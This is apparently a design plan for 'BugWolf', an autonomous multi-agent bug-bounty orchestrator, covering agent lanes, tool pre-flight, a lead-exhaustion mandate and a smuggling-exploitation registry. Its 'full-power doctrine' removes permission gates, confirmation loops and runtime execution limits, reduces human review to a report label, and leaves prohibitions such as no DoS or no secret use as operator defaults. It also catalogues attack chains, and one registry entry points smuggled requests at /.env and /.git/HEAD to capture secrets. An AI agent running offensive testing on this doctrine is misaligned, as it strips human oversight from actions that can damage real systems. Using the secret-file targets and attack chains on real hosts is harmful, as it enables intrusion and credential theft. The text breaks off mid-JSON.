# BugWolf Agent Orchestrator — Plan v2 (Performance-First)

**Status:** Proposed — supersedes `BUGWOLF_OMC_UPGRADE_PLAN.md`
**Date:** 2026-09-02
**Target:** BugWolf v1.2.11
**Reference:** oh-my-claudecode v5.1.0 — feature parity target, performance baseline to beat
**Incorporates:** All 10 revisions from `PLAN_AUDIT.md` (file-by-file verified)
**Layers added post-audit (all mandatory):** hunt-yield engineering (§5.4) · lead-exhaustion mandate (§5.5) · elite-workflow parity + knowledge-ingestion ledger (§5.6, batches 1–4) · pre-flight/MCP gates (§4.5)

---

## 1. Objective

Make BugWolf an **agent orchestrator with OMC's full feature set and higher performance**:

- skills, commands, agent registry, team lanes, persistent modes, model routing, durable task state;
- **zero capability throttles** — no permission gates, no depth reduction, no execution boundaries in the runtime;
- **measurably faster than OMC** on dispatch latency, worker startup, hook overhead, context efficiency, and resume speed.

This is a **wiring plan, not a build-from-scratch plan**. The audit verified that 9 of the 12 required runtime components already exist in `tools/`. The work is composition, not construction.

## 2. Full-power doctrine (read first)

The runtime enforces **nothing** that slows or narrows research:

| Removed | Consequence |
|---|---|
| Permission gates in scheduler/executor | Tasks dispatch without approval round-trips |
| Depth reduction by gates or scope | Mirrors `configs/readiness.json`: `depth_never_reduced_by_gates: true` |
| Execution boundaries in the runtime | `execution_semantics.py` semantics everywhere: shape validation only |
| Autonomous-confirm workflows | Agents act on plan without confirmation loops |

**Two records, not gates** (kept deliberately — they create value, they never block):

1. **Operator target-spec + attestation at intake** — one JSON record binding findings to an authorized target. This is what makes findings *submittable* to HackerOne/Bugcrowd/Immunefi. Without it, findings are unattributable and worth zero bounty. It costs one file write at mission start.
2. **Human-review as report state** — `HUMAN_REVIEWED` is a lifecycle state on the *report*, never a blocker on *execution*. Agents hunt, chain, and validate at full depth; the report labels what was machine-verified vs operator-reviewed.

**One exclusion, non-negotiable for output quality:** the runtime does not self-discover targets outside the operator-declared spec. This is not a safety boundary — it is a quality boundary. A campaign's value is monotonic in signal-to-noise; scanning unrelated assets destroys the report's credibility and the operator's standing with programs. Scope focus = performance, in the metric that matters.

Everything else is unrestricted. No new gate of any kind is introduced by this plan.

## 3. Asset inventory — what already exists (verified)

Every item below was verified file-by-file during the audit. **Reuse, do not rebuild.**

| Component | Existing module | Status for v2 |
|---|---|---|
| Model routing | `tools/core/model_router.py` — 3 tiers, complexity-scored, advisory, fail-open | Extend with `configs/models.json` profile mapping |
| Typed event bus | `tools/core/signal_bus.py` — 16 events, JSONL persist, replay, `publish_or_warn` | Extend with 12 new events (task-graph, lead, pre-flight — canonical list in §4.2) |
| Agent mailbox transport | `tools/core/agent_bus.py` — persistent inbox/processed/deliveries | Adopt as lane transport |
| Parallel execution | `tools/fleet.py` `FleetExecutor` — ThreadPoolExecutor, bounded, shutdown flag | Extend with task-graph dispatch |
| Scheduling | `tools/discovery_scheduler.py` `DiscoveryScheduler` | Extend with dependency awareness |
| Capability registry | `tools/capability_registry.py` (643+ lines) | Extend into agent registry |
| Readiness/claims manifest | `tools/readiness.py` + `configs/readiness.json` (L0–L4) | Keep; drives generated capability manifest |
| NL mission intake | `tools/harness_command.py` — parses `bugwolf --full attack this target X` into plans | Build `MissionSpec` on `parse_invocation` |
| Intake provenance | `tools/target_intake.py` | Attach output to MissionSpec (record only) |
| Campaign engine | `tools/core/campaign_orchestrator.py`, `stage_controller.py`, `research_loop.py`, `research_thread.py` | Migrate behind adapters |
| Live execution + fuzz | `tools/core/live_executor.py` (822 lines), `fuzz_bridge.py` | Wrap in ToolReceipt |
| Evidence/refutation | `refutation.py`, `ledger.py`, `chain_of_custody.py`, F0.5 gate | Keep as-is |
| Benchmark harness | `tools/benchmark.py` + `configs/benchmark.json` (incl. negative controls) | Baseline + regression gate |
| Domain specialists | `tools/domains/{api,web,auth,cloud,llm,mobile,smart_contracts}` + `zero_day_tracks.py` | Register as agent lanes |

**Genuinely new (only these):** `MissionSpec/TaskSpec/TaskResult/ToolReceipt` contracts, task-graph scheduler layer, agent lane definitions, plugin packaging, persistent-mode state machines, `configs/models.json`, performance harness extensions, **lead-exhaustion protocol (`tools/runtime/lead_protocol.py`)**, **mandatory pre-flight (`tools/runtime/preflight.py` + `tool_manifest.py`)**, **elite-parity infrastructure** (checklist registry, coverage ledger, `accounts.py`, `oast.py`, `race_engine.py`, `browser_driver.py`, `bounty_patterns.json`, optional `burp_bridge.py`).

**Constraint:** top-level shims (`tools/{campaign_orchestrator,research_loop,stage_controller,agent_bus}.py`) must stay importable and CLI-runnable throughout — tests and `scripts/ci_bundle_check.sh` reference them.

## 4. Architecture

```text
Claude Code / Freebuff / any harness
        ↓  plugin package (plugin.json + hooks + commands + SKILL.md)
BugWolf intake: harness_command.parse_invocation → MissionSpec (+ target_intake record)
        ↓
MANDATORY pre-flight: machine tool inventory + browserMCP/burpMCP connection gates (§4.5)
        ↓
Task-graph orchestrator (extends FleetExecutor + DiscoveryScheduler)
        ↓  dispatch
Agent lanes (registry-driven, in-process threads, persistent workers)
        ↓  every action
Tool execution plane (live_executor, fuzz_bridge, domain tools) → ToolReceipt
        ↓
signal_bus (16+12 events) + agent_bus (mailboxes) + JSONL durable state
        ↓
Evidence lifecycle → verifier lane → report synthesizer
```

### 4.1 Runtime contracts (new, Phase 1)

```python
MissionSpec   # from harness_command.parse_invocation + target_intake record + budget
TaskSpec      # id, parent, type, domain, inputs, outputs, deps, priority, model_profile, retry, timeout
TaskResult    # status, summary, artifact_refs, evidence_refs, next_tasks, model, prompt_hash, response_hash
ToolReceipt   # command, inputs, output_paths, exit, duration_ms, evidence_refs
ArtifactRef   # path + sha256 + producer_task
```

JSON schemas + validators in `tools/runtime/contracts.py`; malformed results fail explicitly.

### 4.2 Event model (extend, don't replace)

Keep all 16 existing events. Add 12 (task-graph, lead, pre-flight) — **§4.2 is the canonical list**; §3 and §4 quote it by reference:

```text
MISSION_CREATED, PREFLIGHT_COMPLETE, MCP_CONNECTION_CHANGED,
TASK_PLANNED, TASK_STARTED, TASK_COMPLETED,
ARTIFACT_PRODUCED, REPORT_READY,
LEAD_OPENED, LEAD_ESCALATED, LEAD_TERMINAL, OAST_CALLBACK
```

(`BlockerObserved` is unnecessary — `WAF_BLOCKED` + blocked-thread states already carry it.) Adapters publish legacy module events into the new names; nothing subscribes differently during migration.

### 4.3 Agent lanes (registry-driven)

15 roles, each a thin adapter over existing engines — no new analysis logic (browser client added at §5.6 parity):

| Lane | Backing engine |
|---|---|
| commander/planner | `campaign_orchestrator` + `zero_day_tracks` synthesis |
| recon | `asset_discovery`, `recon_engine.sh`, `tech_fingerprint` |
| web/API | `domains/api/*`, `web_api_workflow` |
| auth | `domains/auth/*` |
| business-logic | `multitenant_workflow`, `state_machine_probing` |
| smart-contract | `domains/smart_contracts/*`, `formal_verify`, `web3_fixture_runner` |
| cloud/CI-CD | `domains/cloud/*`, `supply_chain_analyzer` |
| LLM/agentic | `domains/llm/*`, `llm_attack_surface` |
| mobile | `domains/mobile/*` |
| browser client | `browser_driver` — authed deep crawl, XSS/DOM execution proof, cache-deception fetches |
| fuzzing strategist | `fuzz_bridge` + `mutator` |
| verifier | `refutation` + `live_executor.verify_reproducibility` |
| refutation reviewer | `refutation.build_adversarial_prompt` |
| report synthesizer | `reporting` + `sarif_export` |
| learning | `adaptive_learning`, `failure_learning` |

Registry entries: capabilities, input/output artifact types, model profile, concurrency class, cost estimate. Small tasks are **batched into lanes** — one agent never spawns for trivial work.

### 4.4 Plugin packaging (Layer A, replaces plan-v1's SDK adapter)

```text
.claude-plugin/plugin.json
hooks/hooks.json        # SessionStart → harness_guard --verify; Stop → persistent-mode
commands/bugwolf.md, bugwolf-plan.md, bugwolf-run.md, bugwolf-status.md,
        bugwolf-review.md, bugwolf-report.md, bugwolf-stop.md, bugwolf-resume.md
SKILL.md                # exists — keep as the skill body
bridge/bugwolf-mcp.py   # optional MCP server exposing BugWolf tools
```

No Python SDK embedding. BugWolf stays harness-agnostic (Claude Code, Freebuff, Codex, Cursor, Windsurf, Copilot) per `BUGWOLF-HARNESS-CONTRACT-V2`. Hooks are **thin Python shims writing JSONL in milliseconds** — see §5.2.

### 4.5 Mandatory pre-flight layer — machine inventory + MCP connection gates (NON-SKIPPABLE)

**Order rule: no mission work of any kind happens before pre-flight completes** — no recon, no planning dispatch, no traffic. This is not a permission gate (nothing is restricted); it is **capability discovery**: agents cannot use tools they never discovered, and discovering a missing capability mid-campaign wastes lanes and burns budget on degraded technique choices.

**PF1 — Machine tool inventory (the first action of every mission).** `tools/runtime/preflight.py` enumerates, fingerprints (name + version + callable-check), and records every hunting-relevant capability on the machine:

- local binaries: httpx, subfinder, amass, assetfinder, chaos, dnsx, naabu, katana, nuclei, ffuf, feroxbuster, gobuster, gau, waymore, waybackurls, arjun, sqlmap, ghauri, jwt_tool, apktool, jadx, kiterunner, gitleaks, trufflehog, exiftool, forge, anvil, cast, solc, slither, curl, nmap (+NSE), whatever else resolves in PATH;
- BugWolf's own tool modules (already in-tree) and Python dependencies;
- browser (Chrome) + extension presence, Burp Suite Pro presence, all configured MCP servers.

Output: `state/preflight/manifest.json` — `{name, version, invoke_path, status: ready|fallback|missing, last_checked}` + digest. **This manifest is the memory**: see PF3.

**PF2 — MCP connection checks are #1 and #2, before anything else:**

| Order | Connection | What it is | Check | On failure |
|---|---|---|---|---|
| **1** | **browserMCP** | Chrome extension ↔ Claude MCP bridge — drives the operator's real logged-in browser (authed deep crawl, XSS/DOM execution proof, cache-deception incognito fetches) | extension reachable, handshake OK, tab enumeration, snapshot round-trip | browser lane → `BLOCKED` with explicit blocker record; client-side checklist IDs stay `open/blocked-browser` — **never silently skipped** — and are re-dispatched automatically on reconnect |
| **2** | **burpMCP** | Burp Suite Pro MCP server — RAW H1/H2 with TLS impersonation, proxy-history mining (the richest endpoint source), Repeater, Collaborator/OAST | server up (e.g. `http://127.0.0.1:9876/mcp`), tool list retrieved, benign smoke send through a binding | raw-send bindings → fallback chain (curl/httpx via proxy) recorded in `tool_manifest.py`; history-mining tasks marked `degraded`, proxy-dependent leads re-queued when restored |

**PF3 — Memory: remembered from the very start, not re-discovered.** The manifest is written once and attached to the MissionSpec as an `ArtifactRef`; every lane's bounded context includes the capability digest (cheap — artifact reference per P4, not inlined data); `capability_registry.py` gains machine-capability entries so registry-driven lane selection consults *real, verified* capabilities; the SessionStart hook surfaces pre-flight status in <10 ms from cache. Net effect: every agent knows its available weapons from its first token — the model never has to "remember" what exists.

**PF4 — Connection state machine + re-checks.** Every MCP/tool binding runs `UNKNOWN → CHECKING → CONNECTED | DEGRADED(fallback) | BLOCKED`; re-checked on demand, on any dependent-task failure, and periodically (default 60 s). Reconnect publishes `MCP_CONNECTION_CHANGED` → scheduler auto-reopens blocked/degraded leads. Mid-campaign binding failure → re-smoke, re-fallback, record — the same discipline as the elite loop's Phase 0, but enforced by the orchestrator instead of requested in a prompt.

**Events added:** `PREFLIGHT_COMPLETE`, `MCP_CONNECTION_CHANGED`.

## 5. Performance engineering — the part that beats OMC

### 5.1 Where OMC loses time (its architecture, verified)

1. **Worker startup:** team runtime spawns a tmux pane + Node process per worker (`tmux-comm.ts`, `worker-bootstrap.ts`) — seconds per lane, repeated on restart.
2. **Hook overhead:** every prompt/tool event shells out to Node scripts (`run.cjs` per hook, timeouts 3–30s) even when they do nothing.
3. **Keyword routing:** model selection by keyword detection at prompt-submit — no complexity scoring, no per-task calibration.
4. **State fan-out:** team state spread across ~72 modules with checkpoint/recovery sagas — recovery paths are slow and complex.
5. **Context:** agents receive prompt-injected skill text (skill-injector hook) rather than artifact references.

### 5.2 BugWolf's speed levers

| # | Lever | Design | Target vs OMC |
|---|---|---|---|
| P1 | **Zero-subprocess lanes** | All 15 lanes are in-process threads in one interpreter (extends `FleetExecutor`). Persistent workers created once per campaign, reused across tasks. | Worker startup: **~0 ms amortized** vs seconds |
| P2 | **Microsecond hooks** | Each hook is a ~40-line Python shim: read stdin JSON → append one JSONL line → exit 0. No Node, no module loading. SessionStart runs `harness_guard --verify` (cached manifest check, <100 ms). | Hook overhead: **<10 ms** vs OMC's 3–30 s timeouts |
| P3 | **Deterministic complexity routing** | Existing `model_router.route_unit()` scores complexity per task; frontier models only where the score demands. OMC keyword-matches. | Frontier calls: **−40–60%** at equal detection quality |
| P4 | **Artifact-reference context** | Tasks receive `ArtifactRef` paths + digests + a bounded summary — never full campaign history. Compaction = drop summaries, keep refs. | Context duplication: **<20%** across prompts |
| P5 | **Append-only durable state** | One JSONL line per transition, atomic append. Resume = tail the log. No saga recovery, no checkpoint trees. | Resume: **<1 s** regardless of campaign size; transitions durable <1 s |
| P6 | **Dedup before dispatch** | Fingerprint tasks/candidates (`novelty.candidate_fingerprint` exists) before model invocation. | Duplicate model calls: **~0** |
| P7 | **Batched fast-model work** | Classification/extraction tasks queue and batch per lane. | Throughput on triage: **3–5×** |
| P8 | **Bounded output, streaming events** | Tool output caps; events persist incrementally (`signal_bus` already does this). | No unbounded memory; live dashboards free |

### 5.3 Measured targets (gate the release on these)

Baseline first with `tools/benchmark.py` + `configs/benchmark.json` on VulnBank, then:

```text
first plan artifact ..................... < 5 s   (local mission)
first specialist task dispatched ........ < 10 s
lane concurrency (standard workstation) . ≥ 6 independent lanes
worker startup per additional lane ...... < 50 ms   (vs OMC's multi-second tmux+node)
hook round-trip ......................... < 10 ms
task-transition durability .............. < 1 s
resume from cold ........................ < 1 s + replay of pending queue only
context duplication across prompts ...... < 20%
deterministic-task re-run after restart . 0
frontier-model calls per confirmed finding  measured −40% vs keyword routing
signal-to-escalation latency ............ < 5 s
checklist coverage on P0 surfaces ....... 0 applicable IDs untested without recorded reason
browser-proof share, client-side class .. 100%
three-way diff, object-ref endpoints .... 100%
OAST callback → lead attribution ........ 100%
```

Every number ships in the generated capability manifest; a target that isn't met is printed as unmet — never silently dropped.

### 5.4 Hunt-yield engineering — the scheduler's objective is findings

Speed is meaningless without yield. The orchestrator's objective function is **severity-weighted confirmed findings per wall-clock hour** — scheduling, budgets, and escalation all serve it. The finding engines already exist; the orchestrator drives them at full throttle:

**Where each severity class comes from (existing engines, now always-on):**

| Yield class | Engine (verified in tree) | Orchestrator behavior |
|---|---|---|
| **Zero-days / novel classes** | `zero_day.py` `ZeroDayResearchEngine` — `diff_analysis_mode` (behavior deltas), `anomaly_detection_mode` (status/timing/header/error anomalies), `state_machine_probing` (workflow skip/repeat/reorder) | Runs continuously on every surface; fuzz signals feed `hunt_fuzz_signals` automatically |
| **Criticals (chains)** | `deep_chain.py`, `kill_chain.py`, `chain_orchestrator.py`, `domains/auth/ato_chain_planner.py`, `jwt_forgery.py`, `oauth_flow_analyzer.py` | Every candidate is immediately evaluated as a **chain edge** — singles escalate into A→B chains (IDOR→PII, SSRF→metadata→RCE, auth-bypass→ATO) |
| **Highs (business logic)** | `multitenant_workflow`, `state_machine_probing`, `idor_research.py` (BFLA/BOLA matrices), `graphql_gid.py` | Dedicated business-logic lane with reasoning-tier models |
| **Bypasses** | `fuzz_bridge` blocked→bypass threads, `parser_differential`, `http_smuggling_detector`, `header_trust` (15 WAF-bypass families) | WAF-blocked is a **trigger, not a stop**: bypass thread spawns automatically, `carlini_loop` iterates until bypass or exhaustion |
| **Working PoCs** | `exploit_gen.py`, `live_executor.execute_exploit`, `adversary_emulation.py` | Findings ship with executed, replayable exploitation — not theory |

**Yield mechanics (scheduler rules):**

1. **Attack-first priority.** Task priority = `expected_severity × exploitability × novelty`. No fair-share round-robin — the juiciest surface gets the next worker, always.
2. **Hypothesis volume.** `configs/harness/intelligence.json` creative angles (`boundary_flip`, `differential_pair`, `state_and_time`, `negative_space`, `cross_surface_chain`, `provenance_bottleneck`, `agent_control_plane`) generate N novel hypotheses per discovered surface — volume first, refutation separates signal later.
3. **Instant escalation.** Any signal (`FINDING_DISCOVERED`, `AUTH_CANDIDATE`, `CHAIN_PROPOSAL`, …) **preempts** the deep-dive lane with an escalated model profile. Signals never wait in a queue behind batch work.
4. **pass@k budget.** `passk_metrics.py` governs attempt allocation: k independent attempts per high-expected-severity candidate — hit probability scales with attempts, so budget concentrates on the candidates that pay.
5. **Fuzz everything.** Every discovered endpoint/surface gets a fuzz budget; every crash/timeout/anomaly spawns a new hunt thread (existing fuzz→thread wiring). Dead surfaces get killed fast by `failure_learning` so budget never pools in dead ends.
6. **Novelty bias.** `novelty.py` fingerprinting deprioritizes known-pattern duplicates and boosts candidates matching no prior fingerprint — the budget chases what's new.
7. **Verification never slows the hunt.** Refutation/verifier lanes run **in parallel on completed candidates**; hunt lanes never block on verification. Precision protects the report; throughput protects the hunt.

**Honesty note (stays in the manifest):** no tool can guarantee a zero-day — `configs/readiness.json` already claims `zero_day_guarantee: false`. What this architecture does is maximize the probability: more surfaces covered in parallel, more hypotheses per surface, more attempts per candidate, instant escalation, and chains assembled automatically. That volume × novelty × persistence is where zero-days come from.

**New yield metrics (join §5.3 targets; signal-to-escalation latency already lives in §5.3):**

```text
severity-weighted confirmed findings / hour (VulnBank-extended) ... tracked vs single-session baseline
high+ share of confirmed findings ................................ tracked
chain depth of criticals ......................................... tracked (≥2 for chain-classified)
novel-class candidates per campaign ............................. tracked
```

### 5.5 Lead-exhaustion mandate — anti-shortcut layer (MANDATORY)

**The problem this layer exists for:** LLM agents satisfice. Given an insight, they try the most plausible technique once — fail — and move to the next surface. Orchestration alone does not fix this: a fast scheduler just abandons leads faster. On a live target the payout is usually in the 7th bypass variant, the untested parser differential, or a primitive published last month that the model's memory predates. This layer makes abandonment **structurally impossible**.

**R1 — Every insight becomes a durable Lead, automatically.** Any recognized pattern that could yield a finding — anomaly, differential, schema quirk, auth oddity, header reflection, state-machine gap, version indicator, verbose error, timing skew, fuzzy intuition — is promoted to a `LeadSpec` artifact the moment it is observed. Insight → Lead is unconditional; a TaskResult that mentions an insight without a Lead ID is **rejected as malformed by contracts.py**. Agents cannot "note" things.

**R2 — Terminal states only.** A lead closes ONLY by:

- `PWNED` — reproduced, replayable evidence (existing F0.5 / `verify_reproducibility` path);
- `REFUTED` — deterministic counter-evidence proving the bug class inapplicable ("model thinks it won't work" is not refutation; `refutation.py` evidence rules apply);
- `BUDGET-EXHAUSTED` — permitted only after ALL of: (a) the full technique matrix for its class is recorded tried with per-technique outcomes, (b) at least one internet research refresh produced no new applicable technique, (c) escalation ladder reached T4. The exhausted record ships operator-visible with everything tried.

Anything else is `OPEN` — including the agent's judgment that it "probably wouldn't work."

**R3 — Technique matrix per bug class.** Each lead is instantiated with the full checklist of applicable techniques — the 15 WAF-bypass families, mutation families (`mutator.py`), wordlist families (`wordlist_gen.py`), parser differentials, smuggling variants, auth-flow abuses, header-trust confusions, protocol-level techniques, cloud/chain primitives per domain. The orchestrator iterates the matrix batch-wise and records per-technique outcome (success / partial / failed-with-evidence). `novelty.py` fingerprinting dedups so retries never waste budget. The matrix is a floor, not a ceiling — R4 grows it.

**R4 — Mandatory internet research refresh (never trust memory).** When a lead stalls (N consecutive matrix failures), the orchestrator dispatches a research task for the lead's *specific pattern* — the agent is never allowed to fall back on training memory alone:

- `patch_gap.py` — `fetch_cves_by_tech` / `search_exploitdb` / `search_github_poc` / `fetch_poc`: latest CVEs, public PoCs, exploit-db entries for the fingerprinted stack and version;
- `research_loop.py` — `search_web` / `fetch_url`: targeted queries per technique family ("\<component\> \<version\> auth bypass \<current-year\>", "\<bug class\> new technique", vendor advisories, researcher writeups);
- `paper_intel.py` + `research_sources.SourceRegistry` — academic/whitepaper techniques mapped to concrete probes;
- results are **instruction-stripped** (`strip_instructions`), timestamped, treated as untrusted planning input — never permission, per the harness-intelligence contract — and **converted into new technique-matrix entries** the lead must then consume. If research grows the matrix, the lead cannot close until the growth is tried. Research freshness is stamped; stale (`latest_ready: false`) results are regenerated, never reused.

**R5 — Escalation ladder (shortest path is tier 0, never the last tier):**

| Tier | What runs | Trigger |
|---|---|---|
| T0 | first plausible technique (fast model) | lead opened |
| T1 | full technique matrix, batched (fast/balanced) | T0 failed |
| T2 | research refresh → matrix growth (R4) | stall detected |
| T3 | deep-dive lane: reasoning-tier model + `carlini_loop` adaptive iteration until bypass or exhaustion | T2 exhausted |
| T4 | swarm: k parallel divergent attempts on the single lead (`passk_metrics` budget) — different techniques, different models, same lead | T3 exhausted |

Only T4 completion + a refutation pass can produce `BUDGET-EXHAUSTED`. No tier is skippable.

**R6 — Scheduler enforcement.** This is a *productivity* mandate, not a capability gate — it fights agent laziness, it restricts nothing: contracts.py rejects task results holding open leads; open leads survive stop/resume and are **re-dispatched first** after any restart (resume order: open leads → active chains → new surface recon), so a context reset can never bury a live lead. Leads also never time out while a technique remains untried — timeout applies to idle lanes, not open leads. *Sequencing note:* T3–T4 ship with Phase 6; until then no lead can reach `BUDGET-EXHAUSTED` (T4 is a precondition) — stalled T2-exhausted leads simply stay OPEN and are retried when the ladder completes. The mandate can only get stricter over time, never looser.

**Implementation (mostly wiring — one substantive new module):**

- New: `tools/runtime/lead_protocol.py` — `LeadSpec`, `TechniqueMatrix`, ladder controller, terminal-state validator;
- Extend signal_bus: `LEAD_OPENED`, `LEAD_ESCALATED`, `LEAD_TERMINAL` events;
- Auto-lead wiring: `zero_day` candidates, fuzz anomalies, differential divergences, header findings, schema quirks, `leads.py` → LeadSpec on observation;
- Research wiring: `patch_gap` + `research_loop` + `paper_intel` → research-refresh task templates per bug class.

**Lead metrics (join §5.3):**

```text
leads closed without completed matrix (premature abandonment) ... 0  (hard target)
min techniques tried per closed lead ........................... ≥ matrix size
research refreshes per stalled lead ............................ ≥ 1
lead conversion rate (PWNED / opened) vs single-session ........ tracked
```

### 5.6 Elite-workflow parity — mechanize the best manual hunt loop, then exceed it (MANDATORY)

**Benchmark:** the strongest known single-agent hunt workflow — 9 phases, ~500 canonical checklist IDs across 23 families (OA/MF/PR/EV/ID/SS/AB/RC/SR/CA/BL/FL/AI/IF/CH/IN/XS/RX/AP/SQ/SM/JS/SP), G0–G6 validation ladder, A/B/C account matrix, per-hypothesis OAST subdomains, single-packet HTTP/2 races, Burp+browser tool binding with smoke tests, dead-end registry with re-open triggers, bounty-pattern weighting, nested work-unit budgets, anti-stalling tool-first contract.

**Translation rule:** their checklist prose becomes machine-executable registry entries wired to deterministic tools and lanes; their prompt-level discipline becomes contract-level enforcement. Anything they do by asking the model nicely, we do structurally.

**Parity map** (their capability → BugWolf status → action):

| Their capability | BugWolf status | Action |
|---|---|---|
| 9-phase master loop | `campaign_orchestrator` 12-stage + `stage_controller` integrity digests | EXISTS — phases become task-graph stages |
| state.json + notes + coverage resumability | event-sourced `signal_bus` + append-only JSONL (P5) | EXCEEDS — event replay, not file re-read |
| ~500 canonical checklist IDs | `methodology_playbook` + domain modules (partial) | NEW: `configs/checklists/*.json` machine registry — ID → module → tool → VulnBank fixture, load-on-demand per surface |
| coverage ledger (endpoint × class verdicts, `n-a` requires reason) | `research_core.CoverageTracker` + `surface_model` (partial) | EXTEND: endpoint × method × auth-context × checklist-ID verdict ledger, every verdict → evidence ID |
| G0–G6 gate ladder (incl. G5 fresh-validator re-execution) | `refutation.py` gates + F0.5 + `verify_reproducibility` replay | EXISTS — G5 = verifier lane with zero-shared-context PoC re-execution; make explicit |
| Differential protocol (baseline / mutation / control × 3) | `differential.py` + `differential_runner.py` | EXISTS |
| Account matrix A/B/C, three-way compare, parallel live sessions | `idor_research` BFLA/BOLA matrices (logic only) | NEW: `tools/runtime/accounts.py` — session store, parallel sessions, three-way differential runner (A→A / A→B / anon→B) |
| OAST with `{HYP-ID}` subdomains, callback attribution | none | NEW: `tools/runtime/oast.py` — self-hosted, per-lead subdomains, poller publishes `OAST_CALLBACK` → auto-lead |
| Single-packet race (H2 withhold + synchronized flush) | race planning only | NEW: `tools/validation/race_engine.py` — H2 frame-withhold sync flush; H1 last-byte fallback; read-race-read proof |
| Smuggling incl. Klein/2025 generation | `http_smuggling_detector` + `http_protocol_runner` | EXTEND variants: 0.CL, CL.0, H2.CL, H2.TE, h2c, HTTP/1.2 confusion; **exploitation half from worked example §5.6.1** — response-signal classifier, 7-objective smuggle matrix, follow-up confirmation, sibling-route loop |
| Cache deception + poisoning w/ fresh-context verification | `cache_traversal` + `header_trust` | EXTEND: deception flow (authenticated response cached, fetched fresh/unauthenticated) |
| JWT/OAuth deep ladders (jku/jwk SSRF, nOAuth, PKCE downgrade) | `jwt_forgery`, `oauth_flow_analyzer`, `ato_chain_planner` | EXISTS — verify variant ladders against checklist registry |
| ART payload scheduling (family-diversity, near-neighbor exploitation) | `mutator` + `wordlist_gen` families | EXTEND `fuzz_bridge` ordering: one payload per grammar family first, rotate distant families, exploit near-neighbors on first hit |
| In-session CVE/threat research w/ current CVEs | `patch_gap` + `threat_intel` + `nvd_ingester` + `paper_intel` | EXISTS — and R4 (§5.5) makes it automatic on every stall, not just Phase 2 |
| Proxy-history mining (Burp) | none (no proxy source) | NEW: optional `tools/runtime/burp_bridge.py` — Burp MCP/proxy history + TLS-impersonated raw sends; fallback: own-traffic journal from ledger |
| Browser-validated client-side (XSS = browser proof, authed deep crawl, cache-deception incognito fetch) | HTTP-only probes | NEW: `tools/runtime/browser_driver.py` lane — Playwright/CDP binding, console/screenshot evidence, DOM source→sink confirmation |
| Tool binding manifest + smoke tests + fallback recording | `lab_doctor` preflight | **SUPERSEDED by §4.5 mandatory pre-flight**: `preflight.py` + `tool_manifest.py` — machine inventory, browserMCP/burpMCP gates #1/#2, capability memory, state machine + re-checks |
| Bounty-pattern weighting (top-payout patterns) | `program_fit` (partial) | NEW: `configs/bounty_patterns.json` — pattern → detection cue → scheduler priority boost |
| Dead-end registry + re-open triggers | `failure_learning` | EXTEND: structured triggers (new version / new param / new technique / new privilege / WAF fingerprint change) auto-reopen leads |
| Nested work-unit budgets (25 tests OR 15 min) | MissionSpec budget | EXTEND: per-unit test/minute caps, per-endpoint caps, request ceiling, traffic accounting |
| Anti-stalling tool-first contract (iteration w/o tool calls = failed) | prompt-level there; structural here | EXCEEDS: `contracts.py` rejects task results with zero tool calls or zero evidence — impossible, not discouraged |
| 12 feedback questions / self-audit | `self_eval_harness` + `adaptive_learning` | EXISTS |
| Chain catalog CH-01..15 | `deep_chain` + `kill_chain` + `chain_orchestrator` | EXCEEDS: chains auto-synthesized from live candidates, not a fixed catalog |
| Report QA gate (reproducible, redacted, deduped) | `reporting` + `sarif_export` + 7-Question Gate | EXISTS |

**Structural exceeds — where no manual loop can follow:**

1. **15 lanes in parallel** vs one sequential agent; T4 pass@k swarm concentrates k divergent attempts on a single lead — a human loop runs one attempt at a time.
2. **Lead-exhaustion enforced by contracts** — their anti-stalling clauses live in prose; ours make premature abandonment structurally impossible (§5.5).
3. **Research refresh on every stall** (R4) — their loop researches in Phase 2 only; ours re-researches mid-technique and grows the matrix.
4. **Complexity-based model routing** — frontier spend only where the score demands; single-model loops cannot tier.
5. **Evaluation harness** — VulnBank positives/negative controls, published perf targets, readiness manifest; their loop has no regression benchmark.
6. **Beyond-web natively** — smart contracts (Anvil forks), cloud/IAM graphs, mobile, LLM/agentic; their loop is web-only (AI-01..06 aside).
7. **Hash-linked evidence lineage** (`chain_of_custody`, replay keys) vs flat EVID files.
8. **Cross-campaign learning** — novelty fingerprints, failure learning, technique ledgers persist and bias future missions.

**RoE note:** their hard prohibitions (no DoS, no dumps, no secret use, single-canary standard) become **operator RoE defaults recorded at intake** and per-request attribution in the traffic ledger — behavior follows the operator's declaration exactly; nothing is hard-coded in the runtime.

**New infrastructure deliverables from parity gaps** (all small; registry + drivers, no new science): `configs/checklists/` registry, coverage-ledger extension, `accounts.py`, `oast.py`, `race_engine.py`, `browser_driver.py`, `tool_manifest.py`, `bounty_patterns.json`, optional `burp_bridge.py`.

#### 5.6.1 Worked example: a smuggling guide becomes registry data

A published practitioner guide (HTTP Request Smuggling, Burp Repeater workflow, Apr 2026) demonstrates the ingestion rule from R4: **external knowledge is stripped of instructions, timestamped, and converted into machine-executable registry entries — never trusted as model memory, never executed as prose.**

**What already exists (verified in-tree):** `tools/domains/web/http_smuggling_detector.py` (471 lines, `build_plan`@246, `evaluate`@321) already generates and scores CL.TE, TE.CL, TE.TE, H2.CL, H2.TE, 0.CL, TE.0 probes — a strict superset of the guide's two detection tests — and publishes `SMUGGLING_CANDIDATE`. Detection is done.

**What the guide adds → new registry entries (`configs/checklists/sm_exploit.json`):**

| Registry ID | Content from the guide | Machine form |
|---|---|---|
| `SM-SIG-*` | Response-reading taxonomy ("the most important skill"): mixed response, unexpected data, response shift, partial response, 502, delay 100ms→3s | Signal classifier rules feeding `evaluate`: each signal → confidence weight + next action (confirm-follow-up / escalate / re-probe) |
| `SM-CONF-01` | Inject smuggled request → confirm with follow-up request | Mandatory two-step pair: poison + benign follow-up; verdict requires the shifted/merged response on the follow-up, not the probe |
| `SM-EXP-01..07` | What to smuggle: admin panel, internal API, auth/session endpoint, debug/hidden endpoint, sensitive files, cache poisoning (own canary only), chained requests | Exploitation-objective ladder — a desync lead is not `PWNED` at detection; the matrix iterates all 7 objectives with per-objective evidence standards |
| `SM-SRC-01` | Endpoint sourcing: DevTools network, JS files, API call inventory — "don't guess randomly" | Objective targets come from `endpoints/master.json` provenance (js-analysis, proxy-history), never a wordlist |
| `SM-LOOP-01` | "Change endpoint → repeat" | Loop rule: desync confirmed on one route re-queues sibling high-value routes automatically (anti-satisficing, R2) |

One entry, as the registry schema in practice:

```json
{
  "id": "SM-EXP-05", "family": "smuggling", "requires": ["desync_confirmed"],
  "objective": "sensitive_file", "targets": ["/.env", "/.git/HEAD", "/debug/vars"],
  "evidence_standard": "full secret-bearing body captured via smuggled request;" 
                   "record-and-redact only — no secret use (RoE default)",
  "on_signal": "unexpected-data → PWNED-candidate; 404/403 via smuggled path still records route-exists lead",
